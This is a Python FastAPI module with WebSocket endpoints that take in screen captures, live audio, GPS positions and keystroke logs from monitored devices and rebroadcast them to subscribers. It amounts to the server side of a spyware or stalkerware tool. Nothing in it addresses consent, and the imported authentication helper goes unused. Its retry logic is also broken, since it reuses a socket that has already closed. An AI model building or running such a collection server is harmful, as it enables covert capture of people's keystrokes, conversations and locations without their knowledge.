from fastapi import APIRouter, WebSocket, WebSocketDisconnect, Depends
from sqlalchemy.ext.asyncio import AsyncSession
from typing import Dict, Set
from database import get_db
from models import Device, User
from utils import get_current_user
import json
from datetime import datetime
import asyncio
import logging

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/ws", tags=["websocket"])

# Store active connections
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[int, Set[WebSocket]] = {}

    async def connect(self, websocket: WebSocket, device_id: int):
        await websocket.accept()
        if device_id not in self.active_connections:
            self.active_connections[device_id] = set()
        self.active_connections[device_id].add(websocket)

    def disconnect(self, websocket: WebSocket, device_id: int):
        self.active_connections[device_id].remove(websocket)
        if not self.active_connections[device_id]:
            del self.active_connections[device_id]

    async def broadcast_to_device(self, message: str, device_id: int):
        if device_id in self.active_connections:
            for connection in self.active_connections[device_id]:
                await connection.send_text(message)

manager = ConnectionManager()

@router.websocket("/device/{device_id}/monitor")
async def monitor_device(websocket: WebSocket, device_id: int, db: AsyncSession = Depends(get_db)):
    """WebSocket endpoint for real-time device monitoring"""
    connection_attempts = 0
    max_attempts = 3
    retry_delay = 5  # seconds

    while connection_attempts < max_attempts:
        try:
            await manager.connect(websocket, device_id)
            logger.info(f"Device {device_id} connected successfully")
            
            # Reset connection attempts on successful connection
            connection_attempts = 0
            
            while True:
                try:
                    data = await asyncio.wait_for(websocket.receive_text(), timeout=30.0)
                    try:
                        message = json.loads(data)
                        # Validate message structure
                        if not isinstance(message, dict) or "type" not in message:
                            raise ValueError("Invalid message structure")

                        # Handle different types of monitoring data with validation
                        if message["type"] == "screen_capture":
                            if "data" not in message:
                                raise ValueError("Missing data field in screen capture")
                            await manager.broadcast_to_device(
                                json.dumps({
                                    "type": "screen_update",
                                    "data": message["data"],
                                    "timestamp": datetime.utcnow().isoformat(),
                                    "status": "success"
                                }),
                                device_id
                            )
                        elif message["type"] == "audio_stream":
                            if "data" not in message:
                                raise ValueError("Missing data field in audio stream")
                            await manager.broadcast_to_device(
                                json.dumps({
                                    "type": "audio_update",
                                    "data": message["data"],
                                    "timestamp": datetime.utcnow().isoformat(),
                                    "status": "success"
                                }),
                                device_id
                            )
                        elif message["type"] == "gps_update":
                            if "latitude" not in message or "longitude" not in message:
                                raise ValueError("Missing coordinates in GPS update")
                            await manager.broadcast_to_device(
                                json.dumps({
                                    "type": "location_update",
                                    "latitude": message["latitude"],
                                    "longitude": message["longitude"],
                                    "timestamp": datetime.utcnow().isoformat(),
                                    "status": "success"
                                }),
                                device_id
                            )
                        elif message["type"] == "keylog":
                            if "data" not in message:
                                raise ValueError("Missing data field in keylog")
                            await manager.broadcast_to_device(
                                json.dumps({
                                    "type": "keylog_update",
                                    "data": message["data"],
                                    "timestamp": datetime.utcnow().isoformat(),
                                    "status": "success"
                                }),
                                device_id
                            )
                        else:
                            raise ValueError(f"Unknown message type: {message['type']}")
                            
                    except json.JSONDecodeError as e:
                        logger.error(f"Invalid JSON format from device {device_id}: {str(e)}")
                        await websocket.send_text(json.dumps({
                            "type": "error",
                            "message": "Invalid message format",
                            "timestamp": datetime.utcnow().isoformat()
                        }))
                    except ValueError as e:
                        logger.error(f"Validation error from device {device_id}: {str(e)}")
                        await websocket.send_text(json.dumps({
                            "type": "error",
                            "message": str(e),
                            "timestamp": datetime.utcnow().isoformat()
                        }))
                except asyncio.TimeoutError:
                    # Send ping to keep connection alive
                    await websocket.send_text(json.dumps({
                        "type": "ping",
                        "timestamp": datetime.utcnow().isoformat()
                    }))
                    
        except WebSocketDisconnect:
            logger.warning(f"Device {device_id} disconnected")
            manager.disconnect(websocket, device_id)
            connection_attempts += 1
            if connection_attempts < max_attempts:
                logger.info(f"Attempting to reconnect device {device_id}. Attempt {connection_attempts + 1}/{max_attempts}")
                await asyncio.sleep(retry_delay)
            else:
                logger.error(f"Failed to reconnect device {device_id} after {max_attempts} attempts")
                break
        except Exception as e:
            logger.error(f"Unexpected error for device {device_id}: {str(e)}")
            manager.disconnect(websocket, device_id)
            break

@router.websocket("/device/{device_id}/audio")
async def audio_stream(websocket: WebSocket, device_id: int, db: AsyncSession = Depends(get_db)):
    """WebSocket endpoint for real-time audio streaming"""
    try:
        await manager.connect(websocket, device_id)
        
        while True:
            audio_data = await websocket.receive_bytes()
            # Process and broadcast audio data
            await manager.broadcast_to_device(
                json.dumps({
                    "type": "audio_stream",
                    "data": audio_data.hex(),  # Convert bytes to hex string for JSON
                    "timestamp": datetime.utcnow().isoformat()
                }),
                device_id
            )
            
    except WebSocketDisconnect:
        manager.disconnect(websocket, device_id)